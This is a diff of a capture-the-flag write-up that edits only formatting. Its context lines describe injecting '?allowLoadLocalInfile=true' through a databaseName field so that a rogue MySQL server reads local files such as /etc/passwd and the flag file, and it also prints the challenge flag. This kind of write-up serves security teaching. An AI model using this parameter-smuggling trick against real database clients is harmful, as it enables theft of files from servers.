@@ -99,7 +99,7 @@ databaseName: kek
 
 5. Profit, we got a new connection on our `nc` server
 
-### Exploit
+## Exploit
 1. We can setup a rogue mysql server to read local files from client. [mysql source code](https://github.com/mysql/mysql-connector-j/blob/release/8.x/src/main/protocol-impl/java/com/mysql/cj/protocol/a/NativeProtocol.java#L1784)
 2. To read a local files we need to add a parameter `?allowLoadLocalInfile=true` to connection string. We can inject it with `databaseName`
 ```java
@@ -117,7 +117,7 @@ databaseType: 1337
 databaseName: kek?allowLoadLocalInfile=true'''
 ```
 5. And on a rogue server we get a content of the `/etc/passwd`
-6. Get the flag from `/home/app/flag.txt`. `rctf{t00_much_m4rsh411ing
+6. Get the flag from `/home/app/flag.txt`. `rctf{t00_much_m4rsh411ing`
 
-### Conclusion
+## Conclusion
 Most likely, the author's intended solution was to bypass the `Validator` logic and exploiting CVE-2022-1471, but we used another approach with rogue mysql server.
